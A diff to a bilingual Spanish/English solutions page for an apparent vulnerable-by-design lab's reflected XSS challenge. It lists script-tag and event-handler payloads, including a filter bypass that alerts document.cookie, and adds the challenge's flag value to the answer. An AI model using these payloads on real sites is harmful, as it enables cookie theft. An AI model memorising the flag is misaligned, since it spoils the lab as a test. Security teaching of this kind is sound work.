@@ -92,7 +92,7 @@
     <h3>XSS Reflejado</h3>
     <ol>
       <li>El parámetro <code>q</code> se refleja con <code>|safe</code> en Jinja2 — cualquier HTML/JS se ejecuta.</li>
-      <li><strong>Easy:</strong> <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></li>
+      <li><strong>Easy:</strong> <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code> (la alerta incluye <code>xss_flag=HL{x55_c00k13_57341_5ucc355}</code>).</li>
       <li><strong>Medium:</strong> Filtra <code>&lt;script&gt;</code> tags. Bypass con event handlers:
         <pre>&lt;img src=x onerror=alert(1)&gt;
 &lt;svg onload=alert(document.cookie)&gt;</pre></li>
@@ -123,7 +123,7 @@
     <h3>Reflected XSS</h3>
     <ol>
       <li>The <code>q</code> parameter is reflected with <code>|safe</code> in Jinja2 — any HTML/JS executes.</li>
-      <li><strong>Easy:</strong> <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></li>
+      <li><strong>Easy:</strong> <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code> (the alert includes <code>xss_flag=HL{x55_c00k13_57341_5ucc355}</code>).</li>
       <li><strong>Medium:</strong> Filters <code>&lt;script&gt;</code> tags. Bypass with event handlers:
         <pre>&lt;img src=x onerror=alert(1)&gt;
 &lt;svg onload=alert(document.cookie)&gt;</pre></li>
